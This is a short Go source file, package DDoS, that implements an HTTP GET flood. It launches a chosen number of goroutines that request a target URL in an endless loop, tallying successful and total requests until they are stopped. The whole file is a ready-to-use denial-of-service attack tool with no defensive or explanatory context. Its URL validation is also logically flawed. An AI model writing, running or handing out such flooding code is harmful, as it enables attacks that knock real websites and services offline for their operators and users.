package DDoS

import (
	"fmt"
	"io"
	"runtime"

	"io/ioutil"
	"net/http"
	"net/url"
	"sync/atomic"
)

// GETDDoS ...
type GETDDoS struct {
	ID             int
	URL            string
	StopProcess    *chan bool
	Workers        int
	SuccessRequest int64
	TotalRequest   int64
}

// NewGetDDoS ...
func NewGetDDoS(targetURL string, workers, QueueID int) (*GETDDoS, error) {
	if workers < 1 {
		return nil, fmt.Errorf("Amount of workers cannot be less 1")
	}
	if u, err := url.Parse(targetURL); err == nil || len(u.Host) != 0 {
		s := make(chan bool)
		return &GETDDoS{
			ID:             QueueID,
			URL:            targetURL,
			StopProcess:    &s,
			Workers:        workers,
			SuccessRequest: 0,
			TotalRequest:   0,
		}, nil
	} else {
		return nil, fmt.Errorf("Undefined host or error = %v", err)
	}
}

// Run ...
func (d *GETDDoS) Run() {
	for i := 0; i < d.Workers; i++ {
		go func() {
			for {
				select {
				case <-(*d.StopProcess):
					return
				default:
					resp, err := http.Get(d.URL)
					atomic.AddInt64(&d.TotalRequest, 1)
					if err == nil {
						atomic.AddInt64(&d.SuccessRequest, 1)
						_, _ = io.Copy(ioutil.Discard, resp.Body)
						_ = resp.Body.Close()
					}
				}
				runtime.Gosched()
			}
		}()
	}
}

// Stop ...
func (d *GETDDoS) Stop() {
	for i := 0; i < d.Workers; i++ {
		(*d.StopProcess) <- true
	}
	close(*d.StopProcess)
}

// Result ...
func (d *GETDDoS) Result() (SuccessRequest, totalRequest int64) {
	return d.SuccessRequest, d.TotalRequest
}
